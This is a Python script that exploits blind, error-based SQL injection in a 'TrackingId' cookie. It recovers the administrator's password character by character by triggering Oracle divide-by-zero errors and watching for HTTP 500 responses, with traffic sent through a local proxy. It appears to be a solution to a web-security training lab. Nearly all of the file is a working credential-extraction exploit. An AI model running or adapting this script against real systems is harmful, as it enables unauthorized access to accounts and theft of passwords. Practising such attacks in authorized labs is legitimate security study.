import sys
import requests
import urllib, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password = ""
    for idx in range(1, 21):
        for ch in range(32, 126):
            payload = "' || (select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (idx, ch)
            payload_encoded = urllib.parse.quote(payload)
            cookies = {'TrackingId':'zCfUlpbfIVjmgeTI' + payload_encoded,'session':'zslx6grVie6j5HpzKrqAKZ1s5AaSqdKw'}
            res = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if res.status_code == 500:
                password += chr(ch)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + chr(ch))
                sys.stdout.flush()
    print('\n')


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url> " % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit()
    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password(url)

if __name__ == '__main__':
    main()
